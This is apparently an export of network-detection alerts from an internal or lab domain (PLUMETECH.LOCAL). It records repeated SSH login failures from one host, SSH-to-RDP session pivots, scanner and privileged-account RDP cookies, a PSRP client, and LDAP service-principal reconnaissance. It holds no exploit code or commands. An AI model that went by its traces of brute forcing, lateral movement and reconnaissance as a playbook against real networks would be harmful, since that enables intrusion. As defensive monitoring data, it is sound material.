+Low,33235,2025-03-28T10:22:24Z,Communication,Configuration,RDP New Comms,"New RDP communication profile from host 10.0.9.30 (1921) to host 10.0.9.29 (1729). If unencrypted, may also include the RDP cookie (), selected protocol (hybrid), client_name (), and keyboard_layout ().",RDP New Comms Pattern,"1921,1729",,,10.0.9.30,10.0.9.29,,,
+Low,33236,2025-03-28T10:24:08Z,Communication,Configuration,RDP New Comms,"New RDP communication profile from host 10.0.9.12 (1854) to host 10.0.9.30 (1921). If unencrypted, may also include the RDP cookie (nmap), selected protocol (), client_name (), and keyboard_layout ().",RDP New Comms Pattern,"1921,1854",,,10.0.9.12,10.0.9.30,,,
+Low,33237,2025-03-28T10:22:24Z,Communication,Configuration,RDP New Comms,"New RDP communication profile from host 10.0.9.29 (1729) to host 10.0.9.30 (1921). If unencrypted, may also include the RDP cookie (a), selected protocol (), client_name (), and keyboard_layout ().",RDP New Comms Pattern,"1921,1729",,,10.0.9.29,10.0.9.30,,,
+Low,33238,2025-03-28T10:24:08Z,Communication,Configuration,RDP New Comms,"New RDP communication profile from host 10.0.9.30 (1921) to host 10.0.9.12 (1854). If unencrypted, may also include the RDP cookie (), selected protocol (hybrid), client_name (), and keyboard_layout ().",RDP New Comms Pattern,"1921,1854",,,10.0.9.30,10.0.9.12,,,
+Low,33239,2025-03-28T10:21:14Z,Communication,Configuration,RDP New Comms,"New RDP communication profile from host 10.0.9.11 (1732) to host 10.0.9.30 (1921). If unencrypted, may also include the RDP cookie (a), selected protocol (), client_name (), and keyboard_layout ().",RDP New Comms Pattern,"1921,1732",,,10.0.9.11,10.0.9.30,,,
+Low,33240,2025-03-28T10:12:23Z,Communication,Configuration,RDP New Comms,"New RDP communication profile from host 10.0.9.30 (1921) to host 10.0.9.12 (1854). If unencrypted, may also include the RDP cookie (), selected protocol (hybrid_ex), client_name (), and keyboard_layout ().",RDP New Comms Pattern,"1921,1854",,,10.0.9.30,10.0.9.12,,,
+Low,33241,2025-03-28T10:12:23Z,Communication,Configuration,RDP New Comms,"New RDP communication profile from host 10.0.9.30 (1921) to host 10.0.9.44 (1727). If unencrypted, may also include the RDP cookie (), selected protocol (hybrid_ex), client_name (), and keyboard_layout ().",RDP New Comms Pattern,"1921,1727",,,10.0.9.30,10.0.9.44,,,
+Low,33242,2025-03-28T10:20:35Z,Communication,Configuration,RDP New Comms,"New RDP communication profile from host 10.0.9.12 (1854) to host 10.0.9.30 (1921). If unencrypted, may also include the RDP cookie (admin), selected protocol (), client_name (), and keyboard_layout ().",RDP New Comms Pattern,"1921,1854",,,10.0.9.12,10.0.9.30,,,
+Low,33243,2025-03-28T10:12:23Z,Communication,Configuration,RDP New Comms,"New RDP communication profile from host 10.0.9.30 (1921) to host 10.0.9.29 (1729). If unencrypted, may also include the RDP cookie (), selected protocol (hybrid_ex), client_name (), and keyboard_layout ().",RDP New Comms Pattern,"1921,1729",,,10.0.9.30,10.0.9.29,,,
+Low,33244,2025-03-28T10:12:23Z,Communication,Configuration,RDP New Comms,"New RDP communication profile from host 10.0.9.44 (1727) to host 10.0.9.30 (1921). If unencrypted, may also include the RDP cookie (devel), selected protocol (), client_name (), and keyboard_layout ().",RDP New Comms Pattern,"1921,1727",,,10.0.9.44,10.0.9.30,,,
+Low,33245,2025-03-28T10:12:23Z,Communication,Configuration,RDP New Comms,"New RDP communication profile from host 10.0.9.29 (1729) to host 10.0.9.30 (1921). If unencrypted, may also include the RDP cookie (devel), selected protocol (), client_name (), and keyboard_layout ().",RDP New Comms Pattern,"1921,1729",,,10.0.9.29,10.0.9.30,,,
+Low,33246,2025-03-28T10:12:23Z,Communication,Configuration,RDP New Comms,"New RDP communication profile from host 10.0.9.12 (1854) to host 10.0.9.30 (1921). If unencrypted, may also include the RDP cookie (devel), selected protocol (), client_name (), and keyboard_layout ().",RDP New Comms Pattern,"1921,1854",,,10.0.9.12,10.0.9.30,,,
+Low,33545,2025-03-28T09:19:58Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.9.30.,SSH Authentication Failure,"1921,2896",,,10.0.242.127,10.0.9.30,,7f9c647f-a015-4081-a5af-dba57b32f446,
+Low,33548,2025-03-28T09:19:04Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.9.30.,SSH Authentication Failure,"1921,2896",,,10.0.242.127,10.0.9.30,,4226a4d7-89c4-4632-bd11-798017355954,
+Low,33630,2025-03-28T11:00:38Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.9.45.,SSH Authentication Failure,"2896,1820",,,10.0.242.127,10.0.9.45,,e6e77aff-6967-4e6d-8fc1-568cbf5f4a0a,
+Low,33662,2025-03-28T10:48:06Z,Communication,Threat Behavior,Interactive Session Pivot,Asset 2896 (10.0.242.127) connected via SSH to asset 1921 (10.0.9.30) to then pivot to asset 1729 (10.0.9.29) via RDP.,Interactive Session Pivots,"2896,1729",,,10.0.242.127,10.0.9.29,,,
+Low,33717,2025-03-28T11:19:28Z,Communication,Threat Behavior,Interactive Session Pivot,Asset 2896 (10.0.242.127) connected via SSH to asset 1921 (10.0.9.30) to then pivot to asset 1732 (10.0.9.11) via SSH.,Interactive Session Pivots,"2896,1732",,,10.0.242.127,10.0.9.11,,,
+Low,33729,2025-03-28T11:23:33Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.9.30.,SSH Authentication Failure,"2896,1921",,,10.0.242.127,10.0.9.30,,4a30baad-fbde-4237-a839-5ea9d434e343,
+Low,33733,2025-03-28T11:24:08Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.9.30.,SSH Authentication Failure,"2896,1921",,,10.0.242.127,10.0.9.30,,79065da2-3ea9-4475-bcf0-c223ff4d9109,
+Low,33734,2025-03-28T11:21:07Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.9.30.,SSH Authentication Failure,"2896,1921",,,10.0.242.127,10.0.9.30,,9bebe7fc-653f-4b73-8d66-1008c7dbc5fe,
+Low,33735,2025-03-28T11:20:39Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.9.30.,SSH Authentication Failure,"2896,1921",,,10.0.242.127,10.0.9.30,,03146064-474b-4323-b50e-a75e4b62274c,
+Low,33736,2025-03-28T11:22:02Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.9.30.,SSH Authentication Failure,"2896,1921",,,10.0.242.127,10.0.9.30,,b9b903b0-f79c-42d9-a4ef-182bca74beb4,
+Low,33738,2025-03-28T11:19:13Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.9.30.,SSH Authentication Failure,"2896,1921",,,10.0.242.127,10.0.9.30,,9d0d5a4e-99ef-4b4b-8afd-8a079417d14b,
+Low,33739,2025-03-28T11:19:13Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.9.30.,SSH Authentication Failure,"2896,1921",,,10.0.242.127,10.0.9.30,,8a2abb3e-e4a8-48cb-9a94-8c89d04d279a,
+Low,33740,2025-03-28T11:18:39Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.9.30.,SSH Authentication Failure,"2896,1921",,,10.0.242.127,10.0.9.30,,dc734358-0be2-458c-8698-ab14e7e2ffb1,
+Low,33742,2025-03-28T11:18:22Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.9.30.,SSH Authentication Failure,"2896,1921",,,10.0.242.127,10.0.9.30,,f26df496-c94b-4c44-8d0c-1223a9fee649,
+Low,33743,2025-03-28T11:17:24Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.9.30.,SSH Authentication Failure,"2896,1921",,,10.0.242.127,10.0.9.30,,816578b1-9c07-494a-92f7-f3017d8779ad,
+Low,33764,2025-03-28T11:23:59Z,Communication,Configuration,Detected 20 NewX509Certificate between 2025-03-28T11:09:16.198Z and 2025-03-28T11:23:59.659Z,"Sample NewX509Certificate values include:
+  server: 23.3.89.123, 10.0.5.30, 142.250.181.227, 72.246.29.87, 74.125.99.39, 23.32.238.121, 23.3.110.134, 216.58.206.42, 20.189.173.16, 95.100.158.105;
+  subject: ;
+  not_before: ;
+  server_asset_id: 3867, 3901, 3909, 3918, 3906, 3905, 3616, 3599, 3914, 69;
+  dst__port: ('',);
+  dns: ;
+  uuid: 7432c24b-0c09-4e44-929a-40328d82b7e3, 83545665-1d98-43c7-8085-e5b11a5c2401, 9a72264f-0d20-4e2f-a692-d70bf4c52e18, 710b66c9-2f43-4c0c-885d-5c63013a0fbd, 3a45c965-2b70-4ba4-9838-7e6caf8f14f8, 56d8e41a-98a0-476f-936d-201b48087d9f, 2a4957bb-7372-4b18-8d99-3db50bc686ef, 6ac81012-da8c-424d-92ad-92719a2c8baa, 51a59060-f5b1-48fe-a57e-8dfc9c23de36, ff3f6581-6cb3-4635-9220-ef612b116d17;
+  issuer: ;
+  client_asset_id: 44, 1898, 1709, 1746, 1801, 1729, 1704, 1697, 1914;
+  src__mac: ;
+  not_after: ;
+  dst__mac: ;
+  protocol: ;
+  dst__ip: ;
+  client: 10.0.7.30, 10.0.6.29, 10.0.3.29, 10.0.5.29, 10.0.1.29, 10.0.6.30, 10.0.10.29, 10.0.9.29, 10.0.5.12;
+  src__port: ('',);
+  src__ip: ;",X509 Certificate First Seen,"3867,3901,3909,3918,3906,3905,3616,3599,3914,69,44,1898,1709,1746,1801,1729,1704,1697,1914",,,"23.32.238.121,23.3.89.106,23.3.110.134,95.216.74.145,72.246.29.87,13.89.178.26,142.250.181.227,216.58.206.42,20.189.173.23,8.8.8.8","10.0.1.29,10.0.6.30,10.0.3.29,10.0.6.29,10.0.10.29,10.0.9.29,10.0.5.29,10.0.5.12,10.0.7.30",,"7432c24b-0c09-4e44-929a-40328d82b7e3, 83545665-1d98-43c7-8085-e5b11a5c2401, 9a72264f-0d20-4e2f-a692-d70bf4c52e18, 710b66c9-2f43-4c0c-885d-5c63013a0fbd, 3a45c965-2b70-4ba4-9838-7e6caf8f14f8, 56d8e41a-98a0-476f-936d-201b48087d9f, 2a4957bb-7372-4b18-8d99-3db50bc686ef, 6ac81012-da8c-424d-92ad-92719a2c8baa, 51a59060-f5b1-48fe-a57e-8dfc9c23de36, ff3f6581-6cb3-4635-9220-ef612b116d17",
+Low,33794,2025-03-28T11:42:21Z,Communication,Configuration,Detected 12 NewSMBTraffic between 2025-03-28T11:31:29.266Z and 2025-03-28T11:42:21.141Z,"Sample NewSMBTraffic values include:
+  dst__port: ('',);
+  dst_asset_id: 1680, 1732, 1898, 118, 1910, 1841, 52, 46, 1767, 1810;
+  uuid: 50f3166f-5c02-4947-910f-2331500151ed, efa06317-ec96-4f23-abbd-9ee3df4d036f, a7a5a1f9-da1c-4474-8167-442185f2cbf4, 00336763-76bc-4085-a33e-4909ed0a517e, 30d47459-86f9-49c8-94c8-186e42d0f6c4, 50c42ce6-be66-46b6-855c-aff1cdbaf0f4, 6f707686-5c3c-4c11-814f-0a3fa7ceee28, 5156947a-a413-4249-a810-95a42a584182, 06a5f450-843f-4b46-9361-7901c8dc5a0a, 70cde21e-17eb-4f90-a59f-afc767e8fd29;
+  src__mac: ;
+  dst__mac: ;
+  log_type: SMB_TreeInfo, SMB_FileInfo;
+  protocol: ;
+  versions: , SMB2, SMB1;
+  src_asset_id: 1737, 45, 1772, 1746, 1729, 1754, 1854;
+  dst__ip: ;
+  src__port: ('',);
+  src__ip: ;",New SMB Communication Detection,"1754,1898,1737,45,1772,1746,1729,1854,1680,1732,118,1910,1841,52,46,1767,1810",,,"10.0.6.11,10.0.12.29,10.0.1.11,10.0.7.11,10.0.6.29,10.0.9.29,10.0.9.12","10.0.6.30,10.0.7.29,10.0.9.11,10.0.1.43,10.0.12.30,10.0.7.12,10.0.1.10,10.0.1.12,10.0.7.43,10.0.6.12",,"50f3166f-5c02-4947-910f-2331500151ed, efa06317-ec96-4f23-abbd-9ee3df4d036f, a7a5a1f9-da1c-4474-8167-442185f2cbf4, 00336763-76bc-4085-a33e-4909ed0a517e, 30d47459-86f9-49c8-94c8-186e42d0f6c4, 50c42ce6-be66-46b6-855c-aff1cdbaf0f4, 6f707686-5c3c-4c11-814f-0a3fa7ceee28, 5156947a-a413-4249-a810-95a42a584182, 06a5f450-843f-4b46-9361-7901c8dc5a0a, 70cde21e-17eb-4f90-a59f-afc767e8fd29",
+Low,33798,2025-03-28T11:38:33Z,Communication,Configuration,Detected 15 NewX509Certificate between 2025-03-28T11:25:04.874Z and 2025-03-28T11:38:33.172Z,"Sample NewX509Certificate values include:
+  server: 72.246.28.36, 10.0.11.29, 10.0.9.29, 23.3.89.99, 23.3.89.105, 3.122.153.0, 51.132.193.104, 10.0.11.11, 142.250.185.129, 10.0.7.43;
+  subject: , CN=DC1.PLUMETECH.LOCAL, CN=FS1.PLUMETECH.LOCAL, C=US, ST=WA, L=Redmond, O=Microsoft Corporation, CN=cp601-prod.do.dsp.mp.microsoft.com, CN=CLI1.PLUMETECH.LOCAL;
+  not_before: , 2024-09-05T21:53:26Z, 2025-03-26T02:23:20Z, 2025-03-26T02:16:08Z, 2025-03-26T01:13:18Z;
+  server_asset_id: 3869, 3928, 1721, 1725, 3808, 3929, 432, 1723, 1767, 3921;
+  dst__port: ('',);
+  dns: ;
+  uuid: 1f2f2dc6-c0f2-48a3-9be0-77e29d7af384, 05a65e2e-b7bc-479b-83a7-cb0e1dec8720, 57add063-31d8-4abd-839c-50cd777aa870, 69ca347d-4585-4fa2-9a12-80ef6beebc2f, 38098f5b-184c-4494-8149-e36e79080c98, 5cd72b75-f46f-4d80-ae75-e98d15aefffe, 28688942-0241-42f0-9c62-535a91979ecb, 1f542d88-081f-4316-ab64-bf90f6b2904f, 3ea490c4-8408-4be7-a04b-cc0ca1d65617, 46803ba1-c842-48e4-8020-90f050e0c5ef;
+  issuer: , CN=DC1.PLUMETECH.LOCAL, CN=FS1.PLUMETECH.LOCAL, CN=CLI1.PLUMETECH.LOCAL, C=US, O=Microsoft Corporation, CN=Microsoft Azure RSA TLS Issuing CA 08;
+  client_asset_id: 1916, 1772, 1801, 1933, 1921;
+  src__mac: ;
+  not_after: , 2025-08-31T21:53:26Z, 2025-09-25T02:23:20Z, 2025-09-25T01:13:18Z, 2025-09-25T02:16:08Z;
+  dst__mac: ;
+  protocol: ;
+  dst__ip: ;
+  client: 10.0.9.30, 10.0.8.30, 10.0.7.11, 10.0.10.29, 10.0.11.30;
+  src__port: ('',);
+  src__ip: ;",X509 Certificate First Seen,"3869,3928,1721,1725,3808,3929,432,1723,1767,3921,1916,1772,1801,1933,1921",,,"95.100.158.123,142.250.185.129,10.0.11.12,10.0.11.29,3.122.153.0,51.132.193.104,72.246.28.36,10.0.11.11,10.0.7.43,20.189.173.8","10.0.8.30,10.0.7.11,10.0.10.29,10.0.11.30,10.0.9.30",,"1f2f2dc6-c0f2-48a3-9be0-77e29d7af384, 05a65e2e-b7bc-479b-83a7-cb0e1dec8720, 57add063-31d8-4abd-839c-50cd777aa870, 69ca347d-4585-4fa2-9a12-80ef6beebc2f, 38098f5b-184c-4494-8149-e36e79080c98, 5cd72b75-f46f-4d80-ae75-e98d15aefffe, 28688942-0241-42f0-9c62-535a91979ecb, 1f542d88-081f-4316-ab64-bf90f6b2904f, 3ea490c4-8408-4be7-a04b-cc0ca1d65617, 46803ba1-c842-48e4-8020-90f050e0c5ef",
+Low,33806,2025-03-28T11:38:39Z,Communication,Configuration,Detected 18 RDP New Comms between 2025-03-28T11:27:36.019Z and 2025-03-28T11:38:39.589Z,"Sample RDP New Comms values include:
+  rdp_client_name: ;
+  dst__port: ('',);
+  ip_src: 10.0.1.12, 10.0.7.30, 10.0.4.11, 10.0.4.30, 10.0.9.29, 10.0.7.11, 10.0.11.11, 10.0.10.29, 10.0.11.12, 10.0.10.44;
+  dst_asset_id: 1905, 1721, 1725, 45, 1772, 1807, 1832, 1801, 1723, 1933;
+  rdp_keyboard_layout: ;
+  ip_dst: 10.0.7.30, 10.0.9.30, 10.0.4.11, 10.0.11.29, 10.0.4.30, 10.0.7.11, 10.0.11.11, 10.0.10.29, 10.0.11.12, 10.0.10.44;
+  rdp_selected_protocol: , hybrid, hybrid_ex;
+  src__mac: ;
+  dst__mac: ;
+  protocol: ;
+  src_asset_id: 1721, 1905, 46, 1772, 1723, 1807, 1801, 1832, 1729, 1933;
+  dst__ip: ;
+  src__port: ('',);
+  rdp_rt_cookie: , bin, plumber, PLUMETECHplumber, root, nmap, domain admins, User1, alice;
+  src__ip: ;",RDP New Comms Pattern,"1721,1725,1723,1772,1801,1933,1832,1905,45,46,1807,1729",,,"10.0.11.12,10.0.11.11,10.0.7.11,10.0.10.29,10.0.11.30,10.0.4.11,10.0.4.30,10.0.1.12,10.0.10.44,10.0.9.29","10.0.11.12,10.0.11.29,10.0.11.11,10.0.7.11,10.0.10.29,10.0.11.30,10.0.4.11,10.0.4.30,10.0.1.11,10.0.10.44",,,
+Low,33817,2025-03-28T11:39:40Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.9.30.,SSH Authentication Failure,"1921,2896",,,10.0.242.127,10.0.9.30,,d48b25c9-0b8d-468f-9654-6fa897d1cd22,
+Low,33820,2025-03-28T11:40:53Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.9.30.,SSH Authentication Failure,"1921,2896",,,10.0.242.127,10.0.9.30,,9c519b5b-5de7-4fd9-9b06-6d56a2eb8edd,
+Low,33822,2025-03-28T11:38:07Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.9.30.,SSH Authentication Failure,"1921,2896",,,10.0.242.127,10.0.9.30,,717f8d32-8f81-475a-8657-ad2559f30657,
+Low,33825,2025-03-28T11:37:04Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.9.30.,SSH Authentication Failure,"1921,2896",,,10.0.242.127,10.0.9.30,,8f08184e-5f2b-4a60-b75a-4002c8896fce,
+Low,33827,2025-03-28T11:35:11Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.9.30.,SSH Authentication Failure,"1921,2896",,,10.0.242.127,10.0.9.30,,2b1a053b-f9cc-4fdd-8141-a50e4f8e3ab1,
+Low,33834,2025-03-28T11:30:51Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.9.60.,SSH Authentication Failure,"2896,1922",,,10.0.242.127,10.0.9.60,,34eb1133-75fd-4589-a541-2bd3f8c079ea,
+Low,33854,2025-03-28T11:39:49Z,Communication,Threat Behavior,Interactive Session Pivot,Asset 2896 (10.0.242.127) connected via SSH to asset 1921 (10.0.9.30) to then pivot to asset 1854 (10.0.9.12) via RDP.,Interactive Session Pivots,"2896,1854",,,10.0.242.127,10.0.9.12,,,
+Low,34849,2025-03-28T11:28:59Z,Communication,Configuration,RDP New Comms,"New RDP communication profile from host 10.0.9.29 (1729) to host 10.0.9.30 (1921). If unencrypted, may also include the RDP cookie (nmap), selected protocol (), client_name (), and keyboard_layout ().",RDP New Comms Pattern,"1921,1729",,,10.0.9.29,10.0.9.30,,,
+Low,35012,2025-03-28T11:55:44Z,Communication,Threat Behavior,Interactive Session Pivot,Asset 2896 (10.0.242.127) connected via SSH to asset 1921 (10.0.9.30) to then pivot to asset 1729 (10.0.9.29) via RDP.,Interactive Session Pivots,"2896,1729",,,10.0.242.127,10.0.9.29,,,
+Low,35050,2025-03-28T09:57:38Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.9.30.,SSH Authentication Failure,"2896,1921",,,10.0.242.127,10.0.9.30,,3c1e69c1-dad2-46e4-958d-a1e64d23a664,
+Medium,35086,2025-03-28T12:06:04Z,Indicator,Indicator,Python PSRP Client User-Agent,Python PSRP Client User-Agent,Python User Agent Signatures,"1729,1921",,,10.0.9.30,10.0.9.29,,Network Traffic,
+Low,35111,2025-03-28T12:05:25Z,Communication,Configuration,New SMB Communication detected,New SMB_FileInfo (version: ) traffic between Asset:1921 and Asset:1729,New SMB Communication Detection,"1921,1729",,,10.0.9.30,10.0.9.29,,1a7fafd9-5c20-4001-8885-a1bc84d9aad2,
+Low,35117,2025-03-28T12:09:37Z,Communication,Configuration,Detected 9 RDP New Comms between 2025-03-28T12:04:44.818Z and 2025-03-28T12:09:37.077Z,"Sample RDP New Comms values include:
+  rdp_client_name: ;
+  dst__port: ('',);
+  ip_src: 10.0.8.11, 10.0.8.30, 10.0.11.29, 10.0.9.44;
+  dst_asset_id: 1921, 1933, 1916, 1779;
+  rdp_keyboard_layout: ;
+  ip_dst: 10.0.8.30, 10.0.9.30, 10.0.11.30, 10.0.8.11;
+  rdp_selected_protocol: , hybrid;
+  src__mac: ;
+  dst__mac: ;
+  protocol: ;
+  src_asset_id: 1916, 1727, 1725, 1779;
+  dst__ip: ;
+  src__port: ('',);
+  rdp_rt_cookie: , plumetech.localplumber, jack, root, guest, domain admins, krbtgt, administrator;
+  src__ip: ;",RDP New Comms Pattern,"1916,1921,1779,1727,1725,1933",,,"10.0.8.30,10.0.8.11,10.0.9.44,10.0.11.29","10.0.8.30,10.0.9.30,10.0.8.11,10.0.11.30",,,
+Low,35125,2025-03-28T12:06:04Z,Communication,Indicator,Failed HTTP Logon,"Asset 1729 (10.0.9.29) returned an HTTP response code of 401 'Unauthorized' to asset 1921 (10.0.9.30), which represents a failed logon attempt via HTTP by asset 1921. Logon attempts that result in HTTP status codes such as 401 'Unauthorized', 403 'Forbidden', or 407 'Proxy Authentication Required' can occur legitimately when users mistype credentials or attempt to access resources they are not authorized to use; however, they can also be indicative of malicious activities, such as unauthorized access attempts, brute force attacks, or the misuse of stolen credentials, where adversaries are testing access controls and trying to gain illicit entry into systems.",HTTP Auth Failure,"1729,1921",,,10.0.9.29,10.0.9.30,,fd67874b-3a29-4e43-9c31-5de057e237fe,
+Low,35140,2025-03-28T12:03:45Z,Communication,Threat Behavior,Interactive Session Pivot,Asset 2896 (10.0.242.127) connected via SSH to asset 1921 (10.0.9.30) to then pivot to asset 1727 (10.0.9.44) via RDP.,Interactive Session Pivots,"2896,1727",,,10.0.242.127,10.0.9.44,,,
+Low,35192,2025-03-28T12:23:36Z,Indicator,Threat Behavior,LDAP Request ServicePrincipalName,LDAP Request ServicePrincipalName,LDAP Based Recon,"1921,1732",,,10.0.9.30,10.0.9.11,,Network Traffic,
+Low,35238,2025-03-28T12:27:11Z,Communication,Configuration,Detected 6 RDP New Comms between 2025-03-28T12:14:13.118Z and 2025-03-28T12:27:11.640Z,"Sample RDP New Comms values include:
+  rdp_client_name: ;
+  dst__port: ('',);
+  ip_src: 10.0.4.11, 10.0.9.44, 10.0.8.30, 10.0.9.11, 10.0.6.11, 10.0.8.11;
+  dst_asset_id: 1829, 1916, 1746, 1921, 1779;
+  rdp_keyboard_layout: ;
+  ip_dst: 10.0.6.29, 10.0.9.30, 10.0.8.30, 10.0.4.12, 10.0.8.11;
+  rdp_selected_protocol: , hybrid_ex;
+  src__mac: ;
+  dst__mac: ;
+  protocol: ;
+  src_asset_id: 1732, 1727, 1916, 1832, 1754, 1779;
+  dst__ip: ;
+  src__port: ('',);
+  rdp_rt_cookie: , administrator, plumber;
+  src__ip: ;",RDP New Comms Pattern,"1832,1779,1754,1732,1727,1916,1829,1746,1921",,,"10.0.4.11,10.0.8.11,10.0.6.11,10.0.9.11,10.0.9.44,10.0.8.30","10.0.8.11,10.0.8.30,10.0.4.12,10.0.6.29,10.0.9.30",,,
+Low,35351,2025-03-28T12:39:15Z,Communication,Indicator,Failed HTTP Logon,"Asset 2703 (208.89.74.21) returned an HTTP response code of 403 'Forbidden' to asset 1732 (10.0.9.11), which represents a failed logon attempt via HTTP by asset 1732. Logon attempts that result in HTTP status codes such as 401 'Unauthorized', 403 'Forbidden', or 407 'Proxy Authentication Required' can occur legitimately when users mistype credentials or attempt to access resources they are not authorized to use; however, they can also be indicative of malicious activities, such as unauthorized access attempts, brute force attacks, or the misuse of stolen credentials, where adversaries are testing access controls and trying to gain illicit entry into systems.",HTTP Auth Failure,"1732,2703",,,208.89.74.21,10.0.9.11,,394158e3-5aff-4263-a681-456e8c678ee3,
+Low,35368,2025-03-28T12:22:31Z,Communication,Threat Behavior,Interactive Session Pivot,Asset 2896 (10.0.242.127) connected via SSH to asset 1921 (10.0.9.30) to then pivot to asset 1732 (10.0.9.11) via RDP.,Interactive Session Pivots,"2896,1732",,,10.0.242.127,10.0.9.11,,,
+Low,35548,2025-03-28T12:58:09Z,Communication,Configuration,Detected 6 RDP New Comms between 2025-03-28T12:46:49.991Z and 2025-03-28T12:58:09.956Z,"Sample RDP New Comms values include:
+  rdp_client_name: ;
+  dst__port: ('',);
+  ip_src: 10.0.5.29, 10.0.6.29, 10.0.9.44, 10.0.6.44, 10.0.7.44;
+  dst_asset_id: 1936, 1746, 1754, 1747, 1921, 1914;
+  rdp_keyboard_layout: ;
+  ip_dst: 10.0.7.30, 10.0.9.30, 10.0.6.29, 10.0.6.11, 10.0.6.44, 10.0.5.30;
+  rdp_selected_protocol: , hybrid_ex;
+  src__mac: ;
+  dst__mac: ;
+  protocol: ;
+  src_asset_id: 1727, 1746, 1747, 1704, 1768;
+  dst__ip: ;
+  src__port: ('',);
+  rdp_rt_cookie: , plumetech, frank, bob, helpdesk;
+  src__ip: ;",RDP New Comms Pattern,"1768,1704,1727,1746,1921,1936,1754,1914,1747",,,"10.0.7.44,10.0.5.29,10.0.9.44,10.0.6.29,10.0.6.44","10.0.6.29,10.0.9.30,10.0.5.30,10.0.6.11,10.0.7.30,10.0.6.44",,,
+Low,35550,2025-03-28T12:47:52Z,Communication,Configuration,RDP New Cookie,New RDP cookie helpdesk from host 10.0.9.44 (asset 1727) to host 10.0.9.30 (asset 1921).,RDP New Cookie,"1727,1921",,,10.0.9.44,10.0.9.30,,,
+Low,35555,2025-03-28T12:54:40Z,Communication,Configuration,Detected 23 NewX509Certificate between 2025-03-28T12:39:21.673Z and 2025-03-28T12:54:40.685Z,"Sample NewX509Certificate values include:
+  server: 92.123.104.46, 20.190.159.2, 216.58.206.33, 140.82.121.3, 108.138.26.33, 40.70.76.27, 20.189.173.7, 23.213.161.19, 52.168.117.168, 10.0.11.29;
+  subject: , C=US, ST=Washington, L=Redmond, O=Microsoft Corporation, CN=login.live.com, C=US, ST=WA, L=Redmond, O=Microsoft, OU=DSP, CN=*.prod.do.dsp.mp.microsoft.com, CN=github.com, CN=*.github.io;
+  not_before: , 2025-03-04T20:39:31Z, 2025-02-05T00:00:00Z, 2025-03-07T00:00:00Z, 2025-03-18T00:00:00Z;
+  server_asset_id: 3953, 3958, 3944, 1725, 2722, 354, 3946, 3957, 3960, 3945;
+  dst__port: ('',);
+  dns: ;
+  uuid: 151f9234-5b63-43fa-81b0-e68aa209b3f8, 80790b12-caef-4f7a-9aad-82837c809052, 0ccbe4a7-bab4-48be-8500-9b41bdd28c6e, 0b2e436d-6c91-4c41-ac4f-5d880365964e, 9eee8255-926c-4bc9-889f-85cb67491b44, da9ead47-4450-4f76-9d85-d944260bfca1, 5307a68d-1ba7-4812-b753-8c1a139c013b, 1adf8f0d-a5f0-41f0-b5eb-5ff3e25af425, 92fd8d3f-e925-47b6-825c-239272f356ad, 8b324bd4-2a3f-44d8-a754-1d43c0104aa6;
+  issuer: , C=GB, ST=Greater Manchester, L=Salford, O=Sectigo Limited, CN=Sectigo ECC Domain Validation Secure Server CA, C=US, ST=Washington, L=Redmond, O=Microsoft Corporation, CN=Microsoft ECC Content Distribution Secure Server CA 2.1, C=US, O=DigiCert Inc, CN=DigiCert SHA2 Secure Server CA, C=GB, ST=Greater Manchester, L=Salford, O=Sectigo Limited, CN=Sectigo RSA Domain Validation Secure Server CA;
+  client_asset_id: 1732, 45, 1801, 1933, 1754, 151;
+  src__mac: ;
+  not_after: , 2026-03-04T20:39:31Z, 2026-03-07T23:59:59Z, 2026-02-05T23:59:59Z, 2025-09-18T23:59:59Z;
+  dst__mac: ;
+  protocol: ;
+  dst__ip: ;
+  client: 10.0.1.30, 10.0.9.11, 10.0.6.11, 10.0.10.29, 10.0.1.11, 10.0.11.30;
+  src__port: ('',);
+  src__ip: ;",X509 Certificate First Seen,"1801,1732,1933,1725,1754,151,45,3953,3958,3944,2722,354,3946,3957,3960,3945",,,"10.0.11.29,20.189.173.7,23.213.161.11,40.70.76.27,185.199.110.133,23.213.161.13,52.168.117.168,92.123.104.46,92.123.104.38,104.126.37.162","10.0.10.29,10.0.9.11,10.0.11.30,10.0.6.11,10.0.1.30,10.0.1.11",,"151f9234-5b63-43fa-81b0-e68aa209b3f8, 80790b12-caef-4f7a-9aad-82837c809052, 0ccbe4a7-bab4-48be-8500-9b41bdd28c6e, 0b2e436d-6c91-4c41-ac4f-5d880365964e, 9eee8255-926c-4bc9-889f-85cb67491b44, da9ead47-4450-4f76-9d85-d944260bfca1, 5307a68d-1ba7-4812-b753-8c1a139c013b, 1adf8f0d-a5f0-41f0-b5eb-5ff3e25af425, 92fd8d3f-e925-47b6-825c-239272f356ad, 8b324bd4-2a3f-44d8-a754-1d43c0104aa6",
+Low,35625,2025-03-28T13:02:48Z,Communication,Configuration,New SMB Communication detected,New SMB_TreeInfo (version: ) traffic between Asset:1729 and Asset:1732,New SMB Communication Detection,"1729,1732",,,10.0.9.29,10.0.9.11,,14800e69-7f9a-4b73-b00c-592e0a8653ca,
